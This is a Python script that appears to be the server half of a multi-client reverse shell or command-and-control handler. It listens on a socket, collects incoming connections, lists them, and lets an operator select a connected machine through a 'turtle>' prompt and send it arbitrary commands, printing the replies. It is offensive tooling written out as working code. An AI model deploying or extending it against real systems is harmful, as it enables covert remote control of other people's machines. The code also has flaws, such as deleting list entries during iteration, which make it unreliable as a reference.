import socket
import sys
import threading
import time
from queue import Queue

threads=2
jobs=[1,2]
queue=Queue()
accepted=[]
address=[]


def create_socket():
    try:
        global host
        global port
        global s
        host="localhost"
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("socket error"+str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Bind Port"+str(port))

        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("socket error"+msg)
        bind_socket()

def accepting_connection():
    while True:
         conn,address1=s.accept()
         accepted.append(conn)
         address.append(address1)
         print ("connection established"+address1[0])


def list_connections():
    results = ''

    for i, conn in enumerate(accepted):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del accepted[i]
            del address[i]
            continue

        results = str(i) + "   " + str(address[i][0]) + "   " + str(address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)

def turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

def get_target(cmd):
    
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = accepted[target]
        print("You are now connected to :" + str(address[target][0]))
        print(str(address[target][0]) + ">", end="")
        return conn

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = conn.recv(20480)
                print(client_response.decode(), end="")
        except:
            print("Error sending commands")
            break

def worker():
    for _ in range(threads):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()

def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        elif x==2:
            turtle()

        queue.task_done()
def job():
    for x in jobs:
        queue.put(x)
    queue.join()

worker()
job()